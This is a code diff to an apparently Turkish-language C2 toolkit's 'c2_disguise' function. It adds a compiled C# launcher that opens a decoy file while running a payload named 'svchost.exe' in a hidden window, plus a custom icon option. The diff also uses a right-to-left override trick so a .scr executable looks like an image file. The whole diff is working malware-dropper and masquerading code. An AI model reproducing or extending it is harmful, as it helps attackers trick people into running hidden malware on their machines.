@@ -584,12 +584,15 @@ def c2_disguise():
         print(f"\n{C.DIM}  [*] Yem dosya: EXE açılınca gösterilecek gerçek resim/doküman (opsiyonel){C.RESET}")
         decoy_path = input(f"{C.CYAN}  [?] Yem dosya yolu (boş = yem yok): {C.RESET}").strip().strip('"')
 
+        # İkon soralım
+        icon_path = input(f"{C.CYAN}  [?] Özel ikon dosyası (.ico) yolu (boş = varsayılan): {C.RESET}").strip().strip('"')
+        
         # 5. Hazırla
         import shutil
         final_exe = exe_path
 
         if decoy_path and os.path.exists(decoy_path):
-            print(f"{C.YELLOW}  [*] Yem dosya ile paket oluşturuluyor...{C.RESET}")
+            print(f"{C.YELLOW}  [*] Yem dosya ile EXE paket oluşturuluyor...{C.RESET}")
             decoy_ext = os.path.splitext(decoy_path)[1]
 
             # Çıkış klasörü olarak güvenilir olan TEMP klasörünü kullan
@@ -607,16 +610,46 @@ def c2_disguise():
             shutil.copy2(decoy_path, decoy_dest)
             shutil.copy2(exe_path, exe_dest)
 
-            # VBS launcher: yem dosyayı aç + EXE'yi gizli çalıştır
-            vbs_code = f'''Set WshShell = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
-myDir = fso.GetParentFolderName(WScript.ScriptFullName)
-WshShell.Run Chr(34) & myDir & "\\preview{decoy_ext}" & Chr(34), 1, False
-WshShell.Run Chr(34) & myDir & "\\svchost.exe" & Chr(34), 0, False
-'''
-            vbs_path = os.path.join(pkg_dir, "open.vbs")
-            save_text(vbs_path, vbs_code)
-            final_exe = os.path.join(pkg_dir, "open.vbs")
+            # C# Launcher Code
+            cs_code = f'''using System.Diagnostics;
+using System.IO;
+using System.Reflection;
+
+class Program {{
+    static void Main() {{
+        string baseDir = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
+        string decoy = Path.Combine(baseDir, "preview{decoy_ext}");
+        string payload = Path.Combine(baseDir, "svchost.exe");
+
+        if (File.Exists(decoy)) {{
+            Process.Start(new ProcessStartInfo(decoy) {{ UseShellExecute = true }});
+        }}
+        if (File.Exists(payload)) {{
+            ProcessStartInfo psi = new ProcessStartInfo(payload);
+            psi.WindowStyle = ProcessWindowStyle.Hidden;
+            psi.CreateNoWindow = true;
+            psi.UseShellExecute = false;
+            Process.Start(psi);
+        }}
+    }}
+}}'''
+            cs_path = os.path.join(pkg_dir, "launcher.cs")
+            save_text(cs_path, cs_code)
+            
+            # C# derleyicisi (csc.exe) ile derle
+            csc_path = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
+            if not os.path.exists(csc_path):
+                csc_path = r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
+            
+            final_exe = os.path.join(pkg_dir, "open.exe")
+            
+            cmd = [csc_path, "/target:winexe", "/out:" + final_exe]
+            if icon_path and os.path.exists(icon_path) and icon_path.lower().endswith(".ico"):
+                cmd.append("/win32icon:" + icon_path)
+            cmd.append(cs_path)
+            
+            print(f"{C.YELLOW}  [*] Launcher derleniyor...{C.RESET}")
+            subprocess.run(cmd, capture_output=True)
         else:
             final_exe = exe_path
 
@@ -633,7 +666,7 @@ WshShell.Run Chr(34) & myDir & "\\svchost.exe" & Chr(34), 0, False
         # RLO karakteri ile metni ters ceviririz.
         # Ornek: "resim" + RLO + "gnp.scr" -> "resimrcs.png" (ekranda boyle gorunur)
         # ".scr" executable bir formattir ve ekran koruyucu uzantisidir.
-        real_ext = "vbs" if final_exe.endswith(".vbs") else "scr"
+        real_ext = "scr" if final_exe.endswith(".exe") else final_exe.split('.')[-1]
         
         # Gerçek dosya adi (isletim sisteminin gordugu): base_name + \u202E + reversed_ext + . + real_ext
         # Gorunen dosya adi (kullanicinin gordugu): base_name + reversed_real_ext + . + fake_ext
@@ -652,14 +685,14 @@ WshShell.Run Chr(34) & myDir & "\\svchost.exe" & Chr(34), 0, False
 
         import shutil
         # Eğer yem dosya kullandıysak tüm paketi kopyalamalıyız.
-        # final_exe artık disguise_pkg klasörünün içinde open.vbs.
+        # final_exe artık disguise_pkg klasörünün içinde open.exe
         # Tüm dosyaların stealth_dropper içine kopyalanması gerekiyor.
         if decoy_path and os.path.exists(decoy_path):
             # pkg_dir içindeki dosyaları kopyala
             for f in os.listdir(pkg_dir):
-                if f == "open.vbs":
+                if f == "open.exe" or f == "open.vbs":
                     shutil.copy2(os.path.join(pkg_dir, f), rlo_path)
-                else:
+                elif f != "launcher.cs":
                     shutil.copy2(os.path.join(pkg_dir, f), os.path.join(rlo_dir, f))
         else:
             shutil.copy2(final_exe, rlo_path)
